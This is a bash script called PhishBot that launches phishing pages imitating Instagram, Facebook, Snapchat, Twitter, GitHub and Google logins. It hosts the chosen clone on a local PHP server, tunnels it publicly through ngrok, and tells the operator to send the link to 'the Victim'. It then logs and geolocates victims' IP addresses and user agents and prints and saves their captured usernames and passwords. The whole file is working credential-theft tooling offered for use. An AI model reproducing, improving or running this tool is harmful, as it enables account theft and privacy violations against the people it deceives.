#!/bin/bash
# PhishBot v1.0

trap 'printf "\n";stop;exit 1' 2


depen() {

command -v php > /dev/null 2>&1 || { echo >&2 "I need php  "; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I need wget  "; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "I need unzip  "; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I need curl "; exit 1; }

}

chmod_1(){
        chmod 777 *
        chmod 777 sites/instaram sites/facebook sites/github sites/snapchat sites/twitter sites/google sites/instagram/index_files/
}

menu() {

printf "\e[1;93m [1]~Instagram\t"  | lolcat -p -a -d 7
printf "\e[1;93m [2]~Facebook\n"   | lolcat -p -a -d 7
echo ""
printf "\e[1;93m [3]~Snapchat\t"   | lolcat -p -a -d 7
printf "\e[1;93m  [4]~Twitter \n"    | lolcat -p -a -d 7 
echo ""
printf "\e[1;93m [5]~Github\t"     | lolcat -p -a -d 7
printf "\e[1;93m    [6]~Google\n"     | lolcat -p -a -d 7 
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an options: \e[0m\en' opt


if [[ $opt == 1 ]]; then
server="instagram"
start

elif [[ $opt == 2 ]]; then
server="facebook"
start
elif [[ $opt == 3 ]]; then
server="snapchat"
start
elif [[ $opt == 4 ]]; then
server="twitter"
start
elif [[ $opt == 5 ]]; then
server="github"
start
elif [[ $opt == 6 ]]; then
server="google"
start

else
printf "\e[1;93m [!] Invalid opt!\e[0m\n" | lolcat -p -a -d 7
printf "\e[1;93m [!] Restarting ....!\e[0m\n" | lolcat -p -a -d 7
banner
menu
fi
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
fi


}

banner() {
    clear
        echo $ "██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗" | lolcat -p -a -d 3 
        echo $ "██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝" | lolcat -p -a -d 3  
        echo $ "██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗"  | lolcat -p -a -d 3 
        echo $ "██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║"  | lolcat -p -a -d 3
        echo $ "██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝ " | lolcat -p -a -d 3
        echo $ "╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝"    | lolcat -p -a -d 3                                                            
        echo $ "                 ██████╗  ██████╗ ████████╗                 " | lolcat -p -a -d 3
        echo $ "                 ██╔══██╗██╔═══██╗╚══██╔══╝                "  | lolcat -p -a -d 3
        echo $ "                 ██████╔╝██║   ██║   ██║                     " | lolcat -p -a -d 3
        echo $ "                 ██╔══██╗██║   ██║   ██║                     "  | lolcat -p -a -d 3
        echo $ "                 ██████╔╝╚██████╔╝   ██║                    " | lolcat -p -a -d 3
        echo $ "                 ╚═════╝  ╚═════╝    ╚═╝                     " | lolcat -p -a -d 3

        printf "\e[1;93m       .:.:.\e[0m\e[1;77m This Tool is developed by @Pr0fess0r \e[0m\e[1;93m.:.:.\e[0m\n" | lolcat -p -a -d 3
        echo ""
}


banner_2() {
        echo $ "██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗" | lolcat -p -a -d 3 
        echo $ "██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝" | lolcat -p -a -d 3  
        echo $ "██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗"  | lolcat -p -a -d 3 
        echo $ "██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║"  | lolcat -p -a -d 3
        echo $ "██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝ " | lolcat -p -a -d 3
        echo $ "╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝"    | lolcat -p -a -d 3                                                            
        echo $ "                 ██████╗  ██████╗ ████████╗                 " | lolcat -p -a -d 3
        echo $ "                 ██╔══██╗██╔═══██╗╚══██╔══╝                "  | lolcat -p -a -d 3
        echo $ "                 ██████╔╝██║   ██║   ██║                     " | lolcat -p -a -d 3
        echo $ "                 ██╔══██╗██║   ██║   ██║                     "  | lolcat -p -a -d 3
        echo $ "                 ██████╔╝╚██████╔╝   ██║                    " | lolcat -p -a -d 3
        echo $ "                 ╚═════╝  ╚═════╝    ╚═╝                     " | lolcat -p -a -d 3

        printf "\e[1;93m       .:.:.\e[0m\e[1;77m This Tool is developed by @Pr0fe5s0r \e[0m\e[1;93m.:.:.\e[0m\n" | lolcat -p -a -d 3
        echo ""
}


catch_cred() {

account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account | lolcat -p -a -d 7
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password | lolcat -p -a -d 7
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server | lolcat -p -a -d 7
pkill -f -2 php > /dev/null 2>&1
pkill -f -2 ngrok > /dev/null 2>&1
echo ""
echo ""
echo ""
banner_2
menu

}

getcredentials() {
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Credentials ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred

fi
sleep 1
done 


}

catch_ip() {
touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip | lolcat -p -a -d 7
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua | lolcat -p -a -d 7
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
echo ""
echo "-----------------------------------------------------------------------------------" | lolcat -p -a -d 4
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt


if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[@] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip | lolcat -p -a -d 7
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[@] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent | lolcat -p -a -d 7
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[@] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent | lolcat -p -a -d 7
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[@] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country | lolcat -p -a -d 7
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[@] State:\e[0m\e[1;77m %s\e[0m\n" $state | lolcat -p -a -d 7
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[@] City Location:\e[0m\e[1;77m %s\e[0m\n" $city | lolcat -p -a -d 7
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[@] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp | lolcat -p -a -d 7
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[@] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number | lolcat -p -a -d 7
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[@] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed | lolcat -p -a -d 7
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[@] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency | lolcat -p -a -d 7
fi
##
printf "\n"
rm -rf iptracker.log

getcredentials
}

start() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi


if [[ -e ngrok ]]; then
echo ""

else

arch=$(uname -a | grep -o 'arm')

if [[ $arch == *'arm'* ]]; then
printf "\e[1;93m[!] There is no ngrok. Downloading Ngrok!.....\n" | lolcat -p -a -d 7
sudo wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
printf "\e[1;93m[!] Finall Step!.....\n" | lolcat -p -a -d 7
sudo unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
sudo chmod +x ngrok
sudo rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n" | lolcat -p -a -d 7
exit 1
fi



else
printf "\e[1;93m[!] There is no ngrok. Downloading Ngrok!.....\n" | lolcat -p -a -d 7
sudo wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
printf "\e[1;93m[!] Finall Step!.....\n" | lolcat -p -a -d 7
sudo unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
sudo chmod +x ngrok
sudo rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n" | lolcat -p -a -d 7
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m@\e[1;92m] Starting PHP server...\n" | lolcat -p -a -d 7
cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 5
printf "\e[1;92m[\e[0m@\e[1;92m] Starting NGROK server...\n" | lolcat -p -a -d 7
./ngrok http 3333 > /dev/null 2>&1 &
sleep 8
echo ""
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io") 
printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link | lolcat -p -a -d 7
echo ""
checkfound
}
checkfound() {

printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] If you cant see the link: http://127.0.0.1:4040 And Copy the link. \e[0m\n" | lolcat -p -a -d 7
echo ""
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n" | lolcat -p -a -d 7
while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n IP Found!\n" | lolcat -p -a -d 7
catch_ip

fi
sleep 1
done 

}
chmod_1
banner
depen
menu
